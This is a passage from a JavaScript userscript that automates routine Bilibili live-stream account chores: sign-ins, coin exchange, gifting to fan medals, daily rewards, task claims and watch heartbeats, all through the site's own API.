			.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL = 0;

		    if (config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL ===
			undefined) config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL =
			Essential.Config.CONFIG_DEFAULT.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL;
		    config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL = parseInt(
			config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL, 10);
		    if (config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL < 0) config
			.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL = 0;

		    if (config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER === undefined) config.AUTO_DAILYREWARD_CONFIG
			.COIN_CONFIG.NUMBER = Essential.Config.CONFIG_DEFAULT.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG
			.NUMBER;
		    config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER = parseInt(config.AUTO_DAILYREWARD_CONFIG
										 .COIN_CONFIG.NUMBER, 10);
		    if (config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER < 0) config.AUTO_DAILYREWARD_CONFIG
			.COIN_CONFIG.NUMBER = 0;
		    if (config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_MAX_TIME < 0) config.AUTO_LOTTERY_CONFIG
			.STORM_CONFIG.STORM_MAX_TIME = 20;
		    if (config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_MAX_TIME >= 90) config.AUTO_LOTTERY_CONFIG
			.STORM_CONFIG.STORM_MAX_TIME = 90;
		    if (config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_ONE_LIMIT < 0) config.AUTO_LOTTERY_CONFIG
			.STORM_CONFIG.STORM_ONE_LIMIT = 1;
		    if ($.type(CONFIG.AUTO_GIFT_CONFIG.ROOMID) != 'array') {
			CONFIG.AUTO_GIFT_CONFIG.ROOMID = [0];
		    }
		    if ($.type(CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID) != 'array') {
			CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID = [0];
		    }
		    if (config.DD_BP_CONFIG.BP_KEY === undefined) config.DD_BP_CONFIG.BP_KEY = Essential.Config.DD_BP_CONFIG.BP_KEY;
		    if (config.AUTO_GIFT_CONFIG.GIFT_INTERVAL === undefined) config.AUTO_GIFT_CONFIG.GIFT_INTERVAL = Essential.Config.AUTO_GIFT_CONFIG.GIFT_INTERVAL;
		    if (config.AUTO_GIFT_CONFIG.GIFT_INTERVAL < 1) config.AUTO_GIFT_CONFIG.GIFT_INTERVAL = 1;
		    if (config.AUTO_GIFT_CONFIG.GIFT_LIMIT === undefined) config.AUTO_GIFT_CONFIG.GIFT_LIMIT = Essential.Config.AUTO_GIFT_CONFIG.GIFT_LIMIT;
		    if (config.AUTO_GIFT_CONFIG.GIFT_LIMIT < 0) config.AUTO_GIFT_CONFIG.GIFT_LIMIT = 86400;
		    if (config.AUTO_LOTTERY_CONFIG.SLEEP_RANGE === undefined) config.AUTO_LOTTERY_CONFIG.SLEEP_RANGE = Essential.Config.AUTO_LOTTERY_CONFIG.SLEEP_RANGE;
		    if (config.DD_BP === undefined) config.DD_BP = Essential.Config.DD_BP;
		    if (config.DD_BP_CONFIG.DM_STORM === undefined) config.DD_BP_CONFIG.DM_STORM = Essential.Config.DD_BP_CONFIG.DM_STORM;
		    if (config.AUTO_GIFT_CONFIG.AUTO_LIGHT_LIMIT_LEVEL === undefined) config.AUTO_GIFT_CONFIG.AUTO_LIGHT_LIMIT_LEVEL = Essential.Config.AUTO_GIFT_CONFIG.AUTO_LIGHT_LIMIT_LEVEL;
		    return config;
		},
		_copy: (obj) => {
		    return JSON.parse(JSON.stringify(obj));
		},
		load: () => {
		    try {
			CONFIG = JSON.parse(localStorage.getItem(`${NAME}_CONFIG`)) || {};
			CONFIG = Essential.Config.fix(CONFIG);
			if (Object.prototype.toString.call(CONFIG) !== '[object Object]') throw new Error();
		    } catch (e) {
			CONFIG = Essential.Config._copy(Essential.Config.CONFIG_DEFAULT);
		    }
		    Essential.Config.recurLoad(CONFIG);
		    DEBUG('Essential.Config.load: CONFIG', CONFIG);
		    localStorage.setItem(`${NAME}_CONFIG`, JSON.stringify(CONFIG));
		    BiliPushUtils.Check.sleepTimeRangeBuild();
		},
		save: () => {
		    CONFIG = Essential.Config.recurSave(CONFIG);
		    CONFIG = Essential.Config.fix(CONFIG);
		    Essential.DataSync.down();
		    DEBUG('Essential.Config.save: CONFIG', CONFIG);
		    localStorage.setItem(`${NAME}_CONFIG`, JSON.stringify(CONFIG));
		    window.toast('设置已保存，部分设置需要刷新后生效', 'success');
		},
		clear: () => {
		    CONFIG = Essential.Config._copy(Essential.Config.CONFIG_DEFAULT);
		    Essential.DataSync.down();
		    localStorage.removeItem(`${NAME}_CONFIG`);
		}
	    }, // Need Init After Toast.init and AlertDialog.init
	    Cache: {
		load: () => {
		    try {
			CACHE = JSON.parse(localStorage.getItem(`${NAME}_CACHE`));
			if (Object.prototype.toString.call(CACHE) !== '[object Object]') throw new Error();
			if (CACHE.version !== VERSION) {
			    CACHE.version = VERSION;
			    //Essential.Cache.clear();
			}
		    } catch (err) {
			CACHE = {
			    version: VERSION
			};
			localStorage.setItem(`${NAME}_CACHE`, JSON.stringify(CACHE));
		    }
		    DEBUG('Essential.Cache.load: CACHE', CACHE);
		},
		save: () => {
		    localStorage.setItem(`${NAME}_CACHE`, JSON.stringify(CACHE));
		},
		clear: () => {
		    CACHE = {
			version: VERSION
		    };
		    Essential.DataSync.down();
		    localStorage.removeItem(`${NAME}_CACHE`);
		}
	    },
	    DataSync: {
		init: () => {
		    window[NAME] = {};
		    window[NAME].iframeSet = new Set();
		},
		down: () => {
		    try {
			window[NAME].Info = Info;
			window[NAME].CONFIG = CONFIG;
			window[NAME].CACHE = CACHE;
			for (const iframe of window[NAME].iframeSet) {
			    if (iframe.promise.down) iframe.promise.down.resolve();
			}
		    } catch (err) {}
		}
	    }
	}; // Only Run in MainScript, Need Init after Toast.init

	const Sign = {
	    run: () => {
		try {
		    if (!CONFIG.AUTO_SIGN) return $.Deferred().resolve();
		    if (CACHE.sign_ts && !checkNewDay(CACHE.sign_ts)) {
			// 同一天，不再检查签到
			runTomorrow(Sign.run);
			return $.Deferred().resolve();
		    }
		    return API.sign.doSign().then((response) => {
			DEBUG('Sign.run: API.sign.doSign', response);
			if (response.code === 0) {
			    // 签到成功
			    window.toast(`[自动签到]${response.data.text}`, 'success');
			    CACHE.sign_ts = ts_ms();
			    Essential.Cache.save();
			} else if (response.code === -500 || response.message.indexOf('已') > -1) {
			    // 今天已签到过
			} else {
			    window.toast(`[自动签到]${response.data.text}`, 'caution');
			    return Sign.run();
			}
			runTomorrow(Sign.run);
		    }, () => {
			window.toast('[自动签到]签到失败，请检查网络', 'error');
			return delayCall(() => Sign.run());
		    });
		} catch (err) {
		    window.toast('[自动签到]运行时出现异常，已停止', 'error');
		    console.error(`[${NAME}]`, err);
		    return $.Deferred().reject();
		}
	    }
	}; // Once Run every day

	const Exchange = {
	    run: () => {
		try {
		    if (!CONFIG.SILVER2COIN) return $.Deferred().resolve();
		    if (CACHE.exchange_ts && !checkNewDay(CACHE.exchange_ts)) {
			// 同一天，不再兑换硬币
			runTomorrow(Exchange.run);
			return $.Deferred().resolve();
		    }
		    return Exchange.silver2coin().then(() => {
			CACHE.exchange_ts = ts_ms();
			Essential.Cache.save();
			runTomorrow(Exchange.run);
		    }, () => delayCall(() => Exchange.run()));
		} catch (err) {
		    window.toast('[银瓜子换硬币]运行时出现异常，已停止', 'error');
		    console.error(`[${NAME}]`, err);
		    return $.Deferred().reject();
		}
	    },
	    silver2coin: () => {
		return API.Exchange.silver2coin().then((response) => {
		    DEBUG('Exchange.silver2coin: API.SilverCoinExchange.silver2coin', response);
		    if (response.code === 0) {
			// 兑换成功
			window.toast(`[银瓜子换硬币]${response.msg}`, 'success');
		    } else if (response.code === 403) {
			// 每天最多能兑换 1 个
			// 银瓜子余额不足
			// window.toast(`[银瓜子换硬币]'${response.msg}`, 'info');
		    } else {
			window.toast(`[银瓜子换硬币]${response.msg}`, 'caution');
		    }
		}, () => {
		    window.toast('[银瓜子换硬币]兑换失败，请检查网络', 'error');
		    return delayCall(() => Exchange.silver2coin());
		});
	    }
	}; // Once Run every day

	const Gift = {
	    interval: 600e3,
	    run_timer: undefined,
	    over: false,
	    light_gift: 30607,
	    getMedalList: async () => {
		try {
		    let medal_list = [],
			curPage = 1,
			totalpages = 0;
		    do {
			let response = await API.i.medal(curPage, 25);
			DEBUG('Gift.getMedalList: API.i.medal', response);
			medal_list = medal_list.concat(response.data.fansMedalList);
			curPage = response.data.pageinfo.curPage;
			totalpages = response.data.pageinfo.totalpages;
			curPage++;
		    } while (curPage < totalpages);
		    return medal_list;
		} catch (e) {
		    window.toast('[自动送礼]获取勋章列表失败，请检查网络', 'error');
		    return await delayCall(() => Gift.getMedalList());
		}
	    },
	    getBagList: async () => {
		try {
		    let response = await API.gift.bag_list();
		    DEBUG('Gift.getBagList: API.gift.bag_list', response);
		    Gift.time = response.data.time;
		    return response.data.list;
		} catch (e) {
		    window.toast('[自动送礼]获取包裹列表失败，请检查网络', 'error');
		    return await delayCall(() => Gift.getBagList());
		}
	    },
	    getFeedByGiftID: (gift_id) => {
		let gift_info = Info.gift_list.find(r=>r.id==gift_id);
		if(gift_info){
		    if(gift_info.price > 0){
			return Math.ceil(gift_info.price / 100);
		    }else if(gift_info.rights){
			let group = gift_info.rights.match(/亲密度\+(\d+)/);
			if(group){
			    return Math.ceil(group[1]);
			}
		    }
		}
		return 0;
	    },
	    sort_medals: (medals) => {
		if (CONFIG.AUTO_GIFT_CONFIG.GIFT_SORT) {
		    medals.sort((a, b) => {
			if (b.level - a.level == 0) {
			    return b.intimacy - a.intimacy;
			}
			return b.level - a.level;
		    });
		} else {
		    medals.sort((a, b) => {
			if (a.level - b.level == 0) {
			    return a.intimacy - b.intimacy;
			}
			return a.level - b.level;
		    });
		}
		if (CONFIG.AUTO_GIFT_CONFIG.ROOMID && CONFIG.AUTO_GIFT_CONFIG.ROOMID.length > 0) {
		    let sortRooms = CONFIG.AUTO_GIFT_CONFIG.ROOMID;
		    sortRooms.reverse();
		    for (let froom of sortRooms) {
			let rindex = medals.findIndex(r => r.roomid == froom);
			if (rindex != -1) {
			    let tmp = medals[rindex];
			    medals.splice(rindex, 1);
			    medals.unshift(tmp);
			}
		    }
		}
		return medals;
	    },
	    auto_light: async (medal_list) => {
		try {
		    const feed = Gift.getFeedByGiftID(Gift.light_gift);
		    let noLightMedals = medal_list.filter(it => it.is_lighted == 0 && it.day_limit - it.today_feed >= feed
							  && CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID.findIndex(exp => exp == it.roomid) == -1
							  && CONFIG.AUTO_GIFT_CONFIG.AUTO_LIGHT_LIMIT_LEVEL<=it.level);
		    if (noLightMedals && noLightMedals.length > 0) {
			noLightMedals = Gift.sort_medals(noLightMedals);
			let bag_list = await Gift.getBagList();
			let heartBags = bag_list.filter(r => r.gift_id == Gift.light_gift);
			if (heartBags && heartBags.length > 0) {
			    for (let medal of noLightMedals) {
				let gift = heartBags.find(it => it.gift_id == Gift.light_gift && it.gift_num > 0);
				if (gift) {
				    let remain_feed = medal.day_limit - medal.today_feed;
				    if (remain_feed - feed >= 0) {
					let response = await API.room.room_init(parseInt(medal.roomid, 10));
					let send_room_id = parseInt(response.data.room_id, 10);
					let feed_num = 1;
					let rsp = await API.gift.bag_send(Info.uid, gift.gift_id, medal.target_id,feed_num, gift.bag_id, send_room_id, Info.rnd);
					if (rsp.code === 0) {
					    gift.gift_num -= feed_num;
					    medal.today_feed += feed_num * feed;
					    remain_feed -= feed_num * feed;
					    window.toast(
						`[自动送礼]勋章[${medal.medalName}] 点亮成功，送出${feed_num}个${gift.gift_name}，[${medal.today_feed}/${medal.day_limit}]距离升级还需[${remain_feed}]`,
						'success');
					} else {
					    window.toast(`[自动送礼]勋章[${medal.medalName}] 点亮异常:${rsp.msg}`,
							 'caution');
					}
				    }
				    continue;
				}
				break;
			    }
			}
		    }
		} catch (e) {
		    console.error(e);
		    window.toast(`[自动送礼]点亮勋章 检查出错:${e}`, 'error');
		}
	    },
	    run: async () => {
		const func = () => {
		    window.toast('[自动送礼]送礼失败，请检查网络', 'error');
		    return delayCall(() => Gift.run());
		};
		try {
		    if (!CONFIG.AUTO_GIFT) return;
		    if (Gift.run_timer) clearTimeout(Gift.run_timer);
		    Gift.interval = CONFIG.AUTO_GIFT_CONFIG.GIFT_INTERVAL * 60e3;
		    if (CACHE.gift_ts) {
			const diff = ts_ms() - CACHE.gift_ts;
			if (diff < Gift.interval) {
			    Gift.run_timer = setTimeout(Gift.run, Gift.interval - diff);
			    return;
			}
		    }
		    Gift.over = false;
		    let medal_list = await Gift.getMedalList();
		    if (CONFIG.AUTO_GIFT_CONFIG.AUTO_LIGHT) {
			await Gift.auto_light(medal_list);
		    }
		    DEBUG('Gift.run: Gift.getMedalList().then: Gift.medal_list', medal_list);
		    if (medal_list && medal_list.length > 0) {
			medal_list = medal_list.filter(it => it.day_limit - it.today_feed > 0 && it.level <
						       20);
			medal_list = Gift.sort_medals(medal_list);
			if (CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID && CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID
			    .length > 0) {
			    medal_list = medal_list.filter(r => CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID.findIndex(
				exp => exp == r.roomid) == -1);
			}
			let bag_list = await Gift.getBagList();
			for (let v of medal_list) {
			    if (Gift.over) break;
			    let remain_feed = v.day_limit - v.today_feed;
			    if (remain_feed > 0) {
				let now = ts_s();
				if (!CONFIG.AUTO_GIFT_CONFIG.SEND_ALL) {
				    //送之前查一次有没有可送的
				    let pass = bag_list.filter(r => ![4, 3, 9, 10].includes(r.gift_id) && r
							       .gift_num > 0 && r.expire_at > now && (r.expire_at - now <
												      CONFIG.AUTO_GIFT_CONFIG.GIFT_LIMIT));
				    if (pass.length == 0) {
					break;
				    } else {
					bag_list = pass;
				    }
				}
				window.toast(
				    `[自动送礼]勋章[${v.medalName}] 今日亲密度未满[${v.today_feed}/${v.day_limit}]，预计需要[${remain_feed}]送礼开始`,
				    'info');
				await Gift.sendGift(v, bag_list);
			    } else {
				window.toast(`[自动送礼]勋章[${v.medalName}] 今日亲密度已满`, 'info');
			    }
			}
			CACHE.gift_ts = ts_ms();
			Essential.Cache.save();
		    }
		    await delayCall(() => Gift.run(), Gift.interval);
		} catch (err) {
		    func();
		    window.toast('[自动送礼]运行时出现异常，已停止', 'error');
		    console.error(`[${NAME}]`, err);
		}
	    },
	    sendGift: async (medal, bag_list = []) => {
		if (Gift.time <= 0) Gift.time = ts_s();
		let ruid = medal.target_id;
		let remain_feed = medal.day_limit - medal.today_feed;
		if (remain_feed <= 0) {
		    window.toast(`[自动送礼]勋章[${medal.medalName}] 今日亲密度已满`, 'info');
		    return;
		}
		let response = await API.room.room_init(parseInt(medal.roomid, 10));
		let room_id = parseInt(response.data.room_id, 10);
		if (bag_list.length == 0) {
		    bag_list = await Gift.getBagList();
		}
		let now = ts_s();
		if (!CONFIG.AUTO_GIFT_CONFIG.SEND_ALL) {
		    //送之前查一次有没有可送的
		    let pass = bag_list.filter(r => ![4, 3, 9, 10].includes(r.gift_id) && r.gift_num > 0 &&
					       r.expire_at > now && (r.expire_at - now < CONFIG.AUTO_GIFT_CONFIG.GIFT_LIMIT));
		    if (pass.length == 0) {
			Gift.over = true;
			return;
		    } else {
			bag_list = pass;
		    }
		}
		for (const v of bag_list) {
		    if (remain_feed <= 0) {
			window.toast(
			    `[自动送礼]勋章[${medal.medalName}] 送礼结束，今日亲密度已满[${medal.today_feed}/${medal.day_limit}]`,
			    'info');
			return;
		    }
		    if ((
			//特殊礼物排除
			(![4, 3, 9, 10].includes(v.gift_id)
			 //满足到期时间
			 &&
			 v.expire_at > Gift.time && (v.expire_at - Gift.time < CONFIG.AUTO_GIFT_CONFIG
						     .GIFT_LIMIT)
			)
			//或者全部送满
			||
			CONFIG.AUTO_GIFT_CONFIG.SEND_ALL)
			//永久礼物不自动送
			&&
			v.expire_at > Gift.time) {
			// 检查SEND_ALL和礼物到期时间 送当天到期的
			const feed = Gift.getFeedByGiftID(v.gift_id);
			if (feed > 0) {
			    let feed_num = Math.floor(remain_feed / feed);
			    if (feed_num > v.gift_num) feed_num = v.gift_num;
			    if (feed_num > 0) {
				try {
				    let response = await API.gift.bag_send(Info.uid, v.gift_id, ruid,
									   feed_num, v.bag_id, room_id, Info.rnd);
				    DEBUG('Gift.sendGift: API.gift.bag_send', response);
				    if (response.code === 0) {
					v.gift_num -= feed_num;
					medal.today_feed += feed_num * feed;
					remain_feed -= feed_num * feed;
					window.toast(
					    `[自动送礼]勋章[${medal.medalName}] 送礼成功，送出${feed_num}个${v.gift_name}，[${medal.today_feed}/${medal.day_limit}]距离升级还需[${remain_feed}]`,
					    'success');
				    } else {
					window.toast(`[自动送礼]勋章[${medal.medalName}] 送礼异常:${response.msg}`,
						     'caution');
				    }
				} catch (e) {
				    window.toast('[自动送礼]包裹送礼失败，请检查网络', 'error');
				    return await delayCall(() => Gift.sendGift(medal));
				}
			    }
			}
		    }
		}
	    }
	}; // Once Run every 10 minutes

	const GroupSign = {
	    runHour:9,
	    getGroups: () => {
		return API.Group.my_groups().then((response) => {
		    DEBUG('GroupSign.getGroups: API.Group.my_groups', response);
		    if (response.code === 0) return $.Deferred().resolve(response.data.list);
		    window.toast(`[自动应援团签到]'${response.msg}`, 'caution');
		    return $.Deferred().reject();
		}, () => {
		    window.toast('[自动应援团签到]获取应援团列表失败，请检查网络', 'error');
		    return delayCall(() => GroupSign.getGroups());
		});
	    },
	    signInList:async(list) => {
		//if (i >= list.length) return $.Deferred().resolve();
		try{
		    for(let obj of list){
			let errorCount = 0;
			//自己不能给自己的应援团应援
			if (obj.owner_uid == Info.uid) continue;
			do{
			    try{
				let response = await API.Group.sign_in(obj.group_id, obj.owner_uid);
				DEBUG('GroupSign.signInList: API.Group.sign_in', response);
				if (response.code === 0) {
				    if (response.data.add_num > 0) {
					window.toast(
					    `[自动应援团签到]应援团(group_id=${obj.group_id},owner_uid=${obj.owner_uid})签到成功，当前勋章亲密度+${response.data.add_num}`,
					    'success');
					break;
				    } else if (response.data.status === 1) {
					break;
				    }
				    errorCount++;
				} else {
				    errorCount++;
				    window.toast(`[自动应援团签到]'${response.msg}`, 'caution');
				}
			    }catch(e){
				errorCount++;
			    }
			}while(errorCount<3);
		    }
		}
		catch(e){
		    return delayCall(() => GroupSign.signInList(list));
		}
	    },
	    run: () => {
		try {
		    if (!CONFIG.AUTO_GROUP_SIGN) return $.Deferred().resolve();
		    if (CACHE.group_sign_ts && !checkNewDay(CACHE.group_sign_ts)) {
			// 同一天，不再检查应援团签到
			runTomorrow(GroupSign.run,GroupSign.runHour);
			return $.Deferred().resolve();
		    }
		    let now = new Date();
		    let limit = new Date().setHours(GroupSign.runHour,0,0,0) - now;
		    if(limit>0){
			setTimeout(GroupSign.run,limit);
			return $.Deferred().resolve();
		    }
		    return GroupSign.getGroups().then((list) => {
			return GroupSign.signInList(list).then(() => {
			    CACHE.group_sign_ts = ts_ms();
			    runTomorrow(GroupSign.run,GroupSign.runHour);
			}, () => delayCall(() => GroupSign.run()));
		    }, () => delayCall(() => GroupSign.run()));
		} catch (err) {
		    window.toast('[自动应援团签到]运行时出现异常，已停止', 'error');
		    console.error(`[${NAME}]`, err);
		    return $.Deferred().reject();
		}
	    }
	}; // Once Run every day 9 hours "api.live.bilibili.com"
	const DailyReward = {
	    coin_exp: 0,
	    login: () => {
		return API.DailyReward.login().then(() => {
		    DEBUG('DailyReward.login: API.DailyReward.login');
		    window.toast('[自动每日奖励][每日登录]完成', 'success');
		}, () => {
		    window.toast('[自动每日奖励][每日登录]完成失败，请检查网络', 'error');
		    return delayCall(() => DailyReward.login());
		});
	    },
	    watch: (aid, cid) => {
		if (!CONFIG.AUTO_DAILYREWARD_CONFIG.WATCH) return $.Deferred().resolve();
		return API.DailyReward.watch(aid, cid, Info.uid, ts_s()).then((response) => {
		    DEBUG('DailyReward.watch: API.DailyReward.watch', response);
		    if (response.code === 0) {
			window.toast(`[自动每日奖励][每日观看]完成(av=${aid})`, 'success');
		    } else {
			window.toast(`[自动每日奖励][每日观看]'${response.msg}`, 'caution');
		    }
		}, () => {
		    window.toast('[自动每日奖励][每日观看]完成失败，请检查网络', 'error');
		    return delayCall(() => DailyReward.watch(aid, cid));
		});
	    },
	    coin: (cards, n, i = 0, one = false) => {
		if (!CONFIG.AUTO_DAILYREWARD_CONFIG.COIN) return $.Deferred().resolve();
		if (DailyReward.coin_exp >= CONFIG.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER * 10) {
		    window.toast('[自动每日奖励][每日投币]今日投币已完成', 'info');
		    return $.Deferred().resolve();
		}
		if (i >= cards.length) {
		    window.toast('[自动每日奖励][每日投币]动态里可投币的视频不足', 'caution');
		    return $.Deferred().resolve();
		}
		const obj = JSON.parse(cards[i].card);
		let num = Math.min(2, n);
		if (one) num = 1;
		return API.DailyReward.coin(obj.aid, num).then((response) => {
		    DEBUG('DailyReward.coin: API.DailyReward.coin', response);
		    if (response.code === 0) {
			DailyReward.coin_exp += num * 10;
			window.toast(`[自动每日奖励][每日投币]投币成功(av=${obj.aid},num=${num})`, 'success');
			return DailyReward.coin(cards, n - num, i + 1);
		    } else if (response.code === -110) {
			window.toast('[自动每日奖励][每日投币]未绑定手机，已停止', 'error');
			return $.Deferred().reject();
		    } else if (response.code === 34003) {
			// 非法的投币数量
			if (one) return DailyReward.coin(cards, n, i + 1);
			return DailyReward.coin(cards, n, i, true);
		    } else if (response.code === 34005) {
			// 塞满啦！先看看库存吧~
			return DailyReward.coin(cards, n, i + 1);
		    }
		    window.toast(`[自动每日奖励][每日投币]'${response.msg}`, 'caution');
		    return DailyReward.coin(cards, n, i + 1);
		}, () => delayCall(() => DailyReward.coin(cards, n, i)));
	    },
	    share: (aid) => {
		if (!CONFIG.AUTO_DAILYREWARD_CONFIG.SHARE) return $.Deferred().resolve();
		return API.DailyReward.share(aid).then((response) => {
		    DEBUG('DailyReward.share: API.DailyReward.share', response);
		    if (response.code === 0) {
			window.toast(`[自动每日奖励][每日分享]分享成功(av=${aid})`, 'success');
		    } else if (response.code === 71000) {
			// 重复分享
			window.toast('[自动每日奖励][每日分享]今日分享已完成', 'info');
		    } else {
			window.toast(`[自动每日奖励][每日分享]'${response.msg}`, 'caution');
		    }
		}, () => {
		    window.toast('[自动每日奖励][每日分享]分享失败，请检查网络', 'error');
		    return delayCall(() => DailyReward.share(aid));
		});
	    },
	    dynamic: () => {
		return API.dynamic_svr.dynamic_new(Info.uid, 8).then((response) => {
		    DEBUG('DailyReward.dynamic: API.dynamic_svr.dynamic_new', response);
		    if (response.code === 0) {
			if (response.data.cards[0]) {
			    const obj = JSON.parse(response.data.cards[0].card);
			    const p1 = DailyReward.watch(obj.aid, obj.cid);
			    const p2 = DailyReward.coin(response.data.cards, Math.max(CONFIG.AUTO_DAILYREWARD_CONFIG
										      .COIN_CONFIG.NUMBER - DailyReward.coin_exp / 10, 0));
			    const p3 = DailyReward.share(obj.aid);
			    return $.when(p1, p2, p3);
			} else {
			    window.toast('[自动每日奖励]"动态-投稿视频"中暂无动态', 'info');
			}
		    } else {
			window.toast(`[自动每日奖励]获取"动态-投稿视频"'${response.msg}`, 'caution');
		    }
		}, () => {
		    window.toast('[自动每日奖励]获取"动态-投稿视频"失败，请检查网络', 'error');
		    return delayCall(() => DailyReward.dynamic());
		});
	    },
	    run: () => {
		try {
		    if (!CONFIG.AUTO_DAILYREWARD) return $.Deferred().resolve();
		    if (CACHE.dailyreward_ts && !checkNewDay(CACHE.dailyreward_ts)) {
			// 同一天，不执行每日任务
			runTomorrow(DailyReward.run);
			return $.Deferred().resolve();
		    }
		    return API.DailyReward.exp().then((response) => {
			DEBUG('DailyReward.run: API.DailyReward.exp', response);
			if (response.code === 0) {
			    DailyReward.coin_exp = response.number;
			    DailyReward.login();
			    return DailyReward.dynamic().then(() => {
				CACHE.dailyreward_ts = ts_ms();
				runTomorrow(DailyReward.run);
			    });
			} else {
			    window.toast(`[自动每日奖励]${response.message}`, 'caution');
			}
		    }, () => {
			window.toast('[自动每日奖励]获取每日奖励信息失败，请检查网络', 'error');
			return delayCall(() => DailyReward.run());
		    });
		} catch (err) {
		    window.toast('[自动每日奖励]运行时出现异常', 'error');
		    console.error(`[${NAME}]`, err);
		    return $.Deferred().reject();
		}
	    }
	}; // Once Run every day "api.live.bilibili.com"
	const Task = {
	    interval: 600e3,
	    double_watch_task: false,
	    run_timer: undefined,
	    MobileHeartbeat: false,
	    PCHeartbeat: false,
	    run: async () => {
		try {
		    if (!CONFIG.AUTO_TASK) return $.Deferred().resolve();
		    if (!Info.mobile_verify) {
			window.toast('[自动完成任务]未绑定手机，已停止', 'caution');
			return $.Deferred().resolve();
		    }
		    if (Task.run_timer) clearTimeout(Task.run_timer);
		    if (CACHE.task_ts && !Task.MobileHeartbeat && !Task.PCHeartbeat) {
			const diff = ts_ms() - CACHE.task_ts;
			if (diff < Task.interval) {
			    Task.run_timer = setTimeout(Task.run, Task.interval - diff);
			    return $.Deferred().resolve();
			}
		    }
		    if (Task.MobileHeartbeat) Task.MobileHeartbeat = false;
		    if (Task.PCHeartbeat) Task.PCHeartbeat = false;
		    return API.i.taskInfo().then(async (response) => {
			DEBUG('Task.run: API.i.taskInfo', response);
			for (const key in response.data) {
			    if (typeof response.data[key] === 'object') {
				if (response.data[key].task_id && response.data[key].status ===
				    1) {
				    await Task.receiveAward(response.data[key].task_id);
				} else if (response.data[key].task_id === 'double_watch_task') {
				    if (response.data[key].status === 0) {
					Task.double_watch_task = false;
					if (Token && TokenUtil && Info.appToken && !Task.double_watch_task) {
					    await BiliPushUtils.API.Heart.mobile_info();
					}
				    } else if (response.data[key].status === 2) {
					Task.double_watch_task = true;
				    } else {
					Task.double_watch_task = false;
				    }
				}
			    }
			}
		    }).always(() => {
			CACHE.task_ts = ts_ms();
			localStorage.setItem(`${NAME}_CACHE`, JSON.stringify(CACHE));
			Task.run_timer = setTimeout(Task.run, Task.interval);
		    }, () => delayCall(() => Task.run()));
		} catch (err) {
		    window.toast('[自动完成任务]运行时出现异常，已停止', 'error');
		    console.error(`[${NAME}]`, err);
		    return $.Deferred().reject();
		}
	    },
	    receiveAward: async (task_id) => {
		return API.activity.receive_award(task_id).then((response) => {
		    DEBUG('Task.receiveAward: API.activity.receive_award', response);
		    if (response.code === 0) {
			// 完成任务
			window.toast(`[自动完成任务]完成任务：${task_id}`, 'success');
			if (task_id === 'double_watch_task') Task.double_watch_task = true;
		    } else if (response.code === -400) {
			// 奖励已领取
			// window.toast(`[自动完成任务]${task_id}: ${response.msg}`, 'info');
		    } else {
			window.toast(`[自动完成任务]${task_id}: ${response.msg}`, 'caution');
		    }
		}, () => {
		    window.toast('[自动完成任务]完成任务失败，请检查网络', 'error');
		    return delayCall(() => Task.receiveAward(task_id));
		});
	    }
	}; // Once Run every 10 minutes
	const MobileHeartbeat = {
	    run_timer: undefined,
	    run: async () => {
		try {
		    if (!CONFIG.MOBILE_HEARTBEAT) return $.Deferred().resolve();
		    if (Task.double_watch_task) return $.Deferred().resolve();
		    if (MobileHeartbeat.run_timer && !Task.double_watch_task && Info.mobile_verify) {
			Task.MobileHeartbeat = true;
			Task.run();
		    }
		    if (MobileHeartbeat.run_timer) clearTimeout(MobileHeartbeat.run_timer);
		    //API.HeartBeat.mobile
		    BiliPushUtils.API.Heart.mobile().then((rsp) => {
			DEBUG('MobileHeartbeat.run: API.HeartBeat.mobile');
			MobileHeartbeat.run_timer = setTimeout(MobileHeartbeat.run, 300e3);
		    }, () => delayCall(() => MobileHeartbeat.run()));
		} catch (err) {
		    window.toast('[移动端心跳]运行时出现异常，已停止', 'error');
		    console.error(`[${NAME}]`, err);
		    return $.Deferred().reject();
		}
	    }
	}; // Once Run every 5mins
	const WebHeartbeat = {
	    run_timer: undefined,
	    run: () => {
		try {
		    if (!CONFIG.MOBILE_HEARTBEAT) return $.Deferred().resolve();
		    if (WebHeartbeat.run_timer && !Task.double_watch_task && Info.mobile_verify) {
			Task.WebHeartbeat = true;
			Task.run();
		    }
		    if (WebHeartbeat.run_timer) clearTimeout(WebHeartbeat.run_timer);
		    API.HeartBeat.web().then(() => {
			DEBUG('MobileHeartbeat.run: API.HeartBeat.web');
			WebHeartbeat.run_timer = setTimeout(WebHeartbeat.run, 300e3);
		    }, () => delayCall(() => WebHeartbeat.run()));
		} catch (err) {
		    window.toast('[WEB端心跳]运行时出现异常，已停止', 'error');
		    console.error(`[${NAME}]`, err);
		    return $.Deferred().reject();
		}
	    }
	}; // Once Run every 5mins

	const TreasureBox = {
	    timer: undefined,
	    time_end: undefined,
	    time_start: undefined,
	    promise: {
		calc: undefined,
		timer: undefined
	    },
	    DOM: {
		image: undefined,
		canvas: undefined,
		div_tip: undefined,
		div_timer: undefined
	    },
	    init: () => {
